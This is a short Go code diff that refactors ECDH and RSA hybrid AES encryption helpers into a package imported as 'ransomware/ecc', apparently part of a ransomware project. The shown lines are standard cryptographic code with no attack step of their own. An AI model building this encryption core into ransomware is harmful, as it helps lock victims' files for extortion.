@@ -5,6 +5,7 @@ import (
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/rsa"
+	"ransomware/ecc"
 )
 
 // Generates random 16 byte AES key and encrypts message with it, encrypts the AES key
@@ -45,12 +46,12 @@ func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) []byte {
 
 func ECDHAESEncrypt(msg []byte, publicKey *ecdsa.PublicKey) ([]byte, error) {
 
-	aesKey, cipherPublicKey, err := ECDHGenerateEncryptionKey(publicKey)
+	aesKey, cipherPublicKey, err := ecc.ECDHGenerateEncryptionKey(publicKey)
 	if err != nil {
 		return nil, err
 	}
 
-	cipherPublicMarshal := elliptic.MarshalCompressed(Curve, cipherPublicKey.X, cipherPublicKey.Y)
+	cipherPublicMarshal := elliptic.MarshalCompressed(ecc.Curve, cipherPublicKey.X, cipherPublicKey.Y)
 
 	encrypted, err := EncryptAES(msg, aesKey)
 	if err != nil {
@@ -66,11 +67,11 @@ func ECDHAESDecrypt(msg []byte, privateKey *ecdsa.PrivateKey) []byte {
 
 	cipherPublicMarshal, encryptedMessage := msg[:33], msg[33:]
 
-	x, y := elliptic.UnmarshalCompressed(Curve, cipherPublicMarshal)
+	x, y := elliptic.UnmarshalCompressed(ecc.Curve, cipherPublicMarshal)
 
-	cipherPublicKey := &ecdsa.PublicKey{Curve: Curve, X: x, Y: y}
+	cipherPublicKey := &ecdsa.PublicKey{Curve: ecc.Curve, X: x, Y: y}
 
-	aesKey := ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
+	aesKey := ecc.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
 
 	decrypted, err := DecryptAES(encryptedMessage, aesKey)
 	if err != nil {
